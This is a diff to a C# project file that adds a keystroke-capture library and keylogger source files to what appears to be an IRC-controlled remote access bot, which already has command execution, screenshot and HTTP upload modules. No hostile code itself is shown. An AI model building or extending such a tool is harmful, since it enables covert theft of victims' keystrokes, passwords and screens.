@@ -52,6 +52,9 @@
     <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
   </PropertyGroup>
   <ItemGroup>
+    <Reference Include="KeystrokeAPI, Version=1.0.6.4, Culture=neutral, processorArchitecture=MSIL">
+      <HintPath>..\packages\KeystrokeAPI.1.0.6.4\lib\net40\KeystrokeAPI.dll</HintPath>
+    </Reference>
     <Reference Include="Meebey.SmartIrc4net, Version=0.4.5.0, Culture=neutral, PublicKeyToken=7868485fbf407e0f, processorArchitecture=MSIL">
       <HintPath>..\packages\SmartIrc4net.1.1\lib\Meebey.SmartIrc4net.dll</HintPath>
     </Reference>
@@ -75,6 +78,8 @@
     <Compile Include="Commands\AbstractCommand.cs" />
     <Compile Include="Commands\CMDCommand.cs" />
     <Compile Include="Commands\CommandRegistry.cs" />
+    <Compile Include="Commands\KeyloggerCommand.cs" />
+    <Compile Include="Keylogger.cs" />
     <Compile Include="Commands\ScreenshotCommand.cs" />
     <Compile Include="FileHelper.cs" />
     <Compile Include="HTTPUpload.cs" />
